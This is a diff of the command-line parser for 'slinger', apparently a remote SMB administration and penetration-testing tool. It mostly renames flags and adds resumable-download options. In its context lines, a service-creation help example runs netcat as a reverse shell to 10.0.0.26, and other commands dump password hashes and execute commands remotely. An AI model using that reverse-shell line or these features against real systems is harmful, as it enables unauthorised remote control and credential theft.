@@ -133,7 +133,7 @@ def setup_cli_parser(slingerClient):
     parser_ls = subparsers.add_parser('ls', help='List directory contents', description='List contents of a directory at a specified path.  File paths with spaces must be entirely in quotes.', epilog='Example Usage: ls /path/to/directory')
     parser_ls.add_argument('path', nargs='?', default=".", help='Path to list contents, defaults to current path (default: %(default)s)')
     parser_ls.add_argument('-s', '--sort', choices=['name','size','created','lastaccess','lastwrite'], default="date", help='Sort the directory contents by name, size, or date')
-    parser_ls.add_argument('-sr', '--sort-reverse', action='store_true', help='Reverse the sort order', default=False)
+    parser_ls.add_argument('--sort-reverse', action='store_true', help='Reverse the sort order', default=False)
     parser_ls.add_argument('-l', '--long', action='store_true', help='Display long format listing', default=False)
     parser_ls.add_argument('-r', '--recursive', help='Recursively list directory contents with X depth', default=None, type=int, metavar='depth')
     parser_ls.add_argument('-o', '--output', help='Save output to file', default=None, metavar='filename')
@@ -143,25 +143,25 @@ def setup_cli_parser(slingerClient):
     # Subparser for 'find' command
     parser_find = subparsers.add_parser('find', help='Search for files and directories', description='Search for files and directories across the remote share with advanced filtering options.', epilog='Example Usage: find "*.txt" -path /Users -type f -size +1MB')
     parser_find.add_argument('pattern', help='Search pattern (supports wildcards like *.txt or regex with -regex flag)')
-    parser_find.add_argument('-path', default=".", help='Starting search path (default: current directory)')
-    parser_find.add_argument('-type', choices=['f', 'd', 'a'], default='a', help='Search type: f=files only, d=directories only, a=all (default: %(default)s)')
-    parser_find.add_argument('-size', help='File size filter: +1MB (larger than), -100KB (smaller than), =5GB (exactly)')
-    parser_find.add_argument('-mtime', type=int, help='Modified within N days (positive number)')
-    parser_find.add_argument('-ctime', type=int, help='Created within N days (positive number)')
-    parser_find.add_argument('-atime', type=int, help='Accessed within N days (positive number)')
-    parser_find.add_argument('-regex', action='store_true', help='Use regular expression pattern matching instead of wildcards')
-    parser_find.add_argument('-iname', action='store_true', help='Case insensitive name matching')
-    parser_find.add_argument('-maxdepth', type=int, default=10, help='Maximum search depth (default: %(default)s)')
-    parser_find.add_argument('-mindepth', type=int, default=0, help='Minimum search depth (default: %(default)s)')
-    parser_find.add_argument('-limit', type=int, help='Maximum number of results to return')
-    parser_find.add_argument('-sort', choices=['name', 'size', 'mtime', 'ctime', 'atime'], default='name', help='Sort results by field (default: %(default)s)')
-    parser_find.add_argument('-reverse', action='store_true', help='Reverse sort order')
-    parser_find.add_argument('-format', choices=['table', 'list', 'paths', 'json'], default='table', help='Output format (default: %(default)s)')
+    parser_find.add_argument('--path', default=".", help='Starting search path (default: current directory)')
+    parser_find.add_argument('--type', choices=['f', 'd', 'a'], default='a', help='Search type: f=files only, d=directories only, a=all (default: %(default)s)')
+    parser_find.add_argument('--size', help='File size filter: +1MB (larger than), -100KB (smaller than), =5GB (exactly)')
+    parser_find.add_argument('--mtime', type=int, help='Modified within N days (positive number)')
+    parser_find.add_argument('--ctime', type=int, help='Created within N days (positive number)')
+    parser_find.add_argument('--atime', type=int, help='Accessed within N days (positive number)')
+    parser_find.add_argument('--regex', action='store_true', help='Use regular expression pattern matching instead of wildcards')
+    parser_find.add_argument('--iname', action='store_true', help='Case insensitive name matching')
+    parser_find.add_argument('--maxdepth', type=int, default=10, help='Maximum search depth (default: %(default)s)')
+    parser_find.add_argument('--mindepth', type=int, default=0, help='Minimum search depth (default: %(default)s)')
+    parser_find.add_argument('--limit', type=int, help='Maximum number of results to return')
+    parser_find.add_argument('--sort', choices=['name', 'size', 'mtime', 'ctime', 'atime'], default='name', help='Sort results by field (default: %(default)s)')
+    parser_find.add_argument('--reverse', action='store_true', help='Reverse sort order')
+    parser_find.add_argument('--format', choices=['table', 'list', 'paths', 'json'], default='table', help='Output format (default: %(default)s)')
     parser_find.add_argument('-o', '--output', help='Save results to file')
-    parser_find.add_argument('-empty', action='store_true', help='Find empty files (size = 0) or empty directories')
-    parser_find.add_argument('-hidden', action='store_true', help='Include hidden files and directories')
-    parser_find.add_argument('-progress', action='store_true', help='Show search progress for large operations')
-    parser_find.add_argument('-timeout', type=int, default=120, help='Search timeout in seconds (default: %(default)s)')
+    parser_find.add_argument('--empty', action='store_true', help='Find empty files (size = 0) or empty directories')
+    parser_find.add_argument('--hidden', action='store_true', help='Include hidden files and directories')
+    parser_find.add_argument('--progress', action='store_true', help='Show search progress for large operations')
+    parser_find.add_argument('--timeout', type=int, default=120, help='Search timeout in seconds (default: %(default)s)')
     parser_find.set_defaults(func=slingerClient.find_handler)
 
     # Subparser for 'shares' command
@@ -266,10 +266,10 @@ def setup_cli_parser(slingerClient):
 
     # Subparser for 'servicecreate' command
     parser_svccreate = subparsers.add_parser('serviceadd', help='Create a new service', description='Create a new service on the remote server', epilog=r'Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"', aliases=['svcadd','servicecreate','svccreate'], formatter_class=argparse.RawDescriptionHelpFormatter)
-    parser_svccreate.add_argument('-n', '--servicename', required=True, help='Specify the name of the new service')
-    parser_svccreate.add_argument('-b', '--binarypath', required=True, help='Specify the binary path of the new service')
-    parser_svccreate.add_argument('-d', '--displayname', required=True, help='Specify the display name of the new service')
-    parser_svccreate.add_argument('-s', '--starttype', choices=['auto','demand','system'], default="demand", required=True, help='Specify the start type of the new service (default: %(default)s)')
+    parser_svccreate.add_argument('-n', '--name', required=True, help='Specify the name of the new service')
+    parser_svccreate.add_argument('-b', '--binary-path', required=True, help='Specify the binary path of the new service')
+    parser_svccreate.add_argument('-d', '--display-name', required=True, help='Specify the display name of the new service')
+    parser_svccreate.add_argument('-s', '--start-type', choices=['auto','demand','system'], default="demand", required=True, help='Specify the start type of the new service (default: %(default)s)')
     parser_svccreate.set_defaults(func=slingerClient.create_service)
 
     # Subparser for 'enumtasks' command
@@ -278,7 +278,7 @@ def setup_cli_parser(slingerClient):
     # Subparser for 'tasksshow' command
     parser_taskshow = subparsers.add_parser('taskshow', help='Show task details', description='Show details of a specific task on the remote server', epilog='Example Usage: tasksshow -i 123', aliases=['tasksshow','showtask'])
     taskshowgroup = parser_taskshow.add_mutually_exclusive_group(required=True)
-    taskshowgroup.add_argument('-i', '--taskid', type=int, help='Specify the ID of the task to show')
+    taskshowgroup.add_argument('-i', '--task-id', type=int, help='Specify the ID of the task to show')
     taskshowgroup.add_argument('task_path', type=str, nargs='?', help='Specify the full path of the task to show')
     #taskshowgroup.add_argument('-f', '--folder', type=str, nargs='?', help='Specify the folder to show tasks from')
     parser_taskshow.set_defaults(func=slingerClient.task_show_handler)
@@ -302,7 +302,7 @@ def setup_cli_parser(slingerClient):
     parser_taskdelete = subparsers.add_parser('taskdelete', help='Delete a task', description='Delete a specified task on the remote server', epilog='Example Usage: taskdelete -i 123', aliases=['taskdel','taskrm'])
     taskdeletegroup = parser_taskdelete.add_mutually_exclusive_group(required=True)
     taskdeletegroup.add_argument('task_path', type=str, nargs='?', help='Specify the full path of the task to delete')
-    taskdeletegroup.add_argument('-i', '--taskid', type=int, help='Specify the ID of the task to delete')
+    taskdeletegroup.add_argument('-i', '--task-id', type=int, help='Specify the ID of the task to delete')
     parser_taskdelete.set_defaults(func=slingerClient.task_delete_handler)
 
     # Subparser for 'enumtime' command
@@ -320,6 +320,9 @@ def setup_cli_parser(slingerClient):
     parser_download.set_defaults(func=slingerClient.download_handler)
     parser_download.add_argument('remote_path', help='Specify the remote file path to download')
     parser_download.add_argument('local_path', nargs='?', help='Specify the local file path to download to, optional', default=None)
+    parser_download.add_argument('--resume', action='store_true', help='Resume interrupted download if possible (default: %(default)s)', default=False)
+    parser_download.add_argument('--no-resume', action='store_true', help='Force fresh download, ignore existing partial file', default=False)
+    parser_download.add_argument('--chunk-size', default='64k', help='Chunk size for download (e.g., 64k, 1M, 512k) (default: %(default)s)')
 
     # Subparser for 'mget' command
     parser_mget = subparsers.add_parser('mget', help='Download multiple files', description='Download all files from a specified directory and its subdirectories.  File paths with spaces must be entirely in quotes.', epilog='Example Usage: mget /remote/path /local/path')
@@ -425,7 +428,7 @@ def setup_cli_parser(slingerClient):
     parser_run = subparsers.add_parser('run', help='Run a slinger script or command sequence', description='Run a slinger script or command sequence', epilog='Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"')
     #parser_run.add_argument('-v', '--validate', help='Validate the script or command sequence without running it', action='store_true')
     parser_rungroup = parser_run.add_mutually_exclusive_group(required=True)
-    parser_rungroup.add_argument('-c', '--cmd_chain', help='Specify a command sequence to run')
+    parser_rungroup.add_argument('-c', '--cmd-chain', help='Specify a command sequence to run')
     parser_rungroup.add_argument('-f', '--file', help='Specify a script file to run')
 
     parser_hashdump = subparsers.add_parser('hashdump', help='Dump hashes from the remote server', description='Dump hashes from the remote server', epilog='Example Usage: hashdump')
@@ -451,8 +454,8 @@ def setup_cli_parser(slingerClient):
     parser_getCounter.set_defaults(func=slingerClient.show_perf_counter)
 
     parser_network = subparsers.add_parser('network', help='Display network information', description='Display network information on the remote server', epilog='Example Usage: network')
-    parser_network.add_argument('-tcp', help='Display TCP information', action='store_true', default=False)
-    parser_network.add_argument('-rdp', help='Display RDP information', action='store_true', default=False)
+    parser_network.add_argument('--tcp', help='Display TCP information', action='store_true', default=False)
+    parser_network.add_argument('--rdp', help='Display RDP information', action='store_true', default=False)
     parser_network.set_defaults(func=slingerClient.show_network_info_handler)
 
     parser_atexec = subparsers.add_parser('atexec', help='Execute a command at a specified time', description='Execute a command on the remote server', epilog='Example Usage: atexec -tn "NetSvc" -sh C$ -sp \\\\Users\\\\Public\\\\Downloads\\\\ -c ipconfig')
@@ -471,6 +474,21 @@ def setup_cli_parser(slingerClient):
 
     parser_reload = subparsers.add_parser('reload', help='Reload the current session context (hist file location, plugins, etc)', description='Reload the current sessions context', epilog='Example Usage: reload')
     parser_plugins = subparsers.add_parser('plugins', help='List available plugins', description='List available plugins', epilog='Example Usage: plugins')
+    
+    # Subparser for 'downloads' command (resume download management)
+    parser_downloads = subparsers.add_parser('downloads', help='Manage resume download states', description='Manage resume download states and cleanup', epilog='Example Usage: downloads list')
+    downloads_subparsers = parser_downloads.add_subparsers(dest='downloads_action', help='Downloads management actions')
+    
+    # downloads list command
+    parser_downloads_list = downloads_subparsers.add_parser('list', help='List active resumable downloads', description='Display all active resumable downloads with progress')
+    parser_downloads_list.set_defaults(func=slingerClient.downloads_list_handler)
+    
+    # downloads cleanup command
+    parser_downloads_cleanup = downloads_subparsers.add_parser('cleanup', help='Clean up download states', description='Remove completed, stale, or corrupted download state files')
+    parser_downloads_cleanup.add_argument('--max-age', type=int, default=7, help='Remove state files older than N days (default: %(default)s)')
+    parser_downloads_cleanup.add_argument('--force', action='store_true', help='Force cleanup without confirmation', default=False)
+    parser_downloads_cleanup.set_defaults(func=slingerClient.downloads_cleanup_handler)
+    
     return parser
 
 # def validate_args(parser, arg_list):
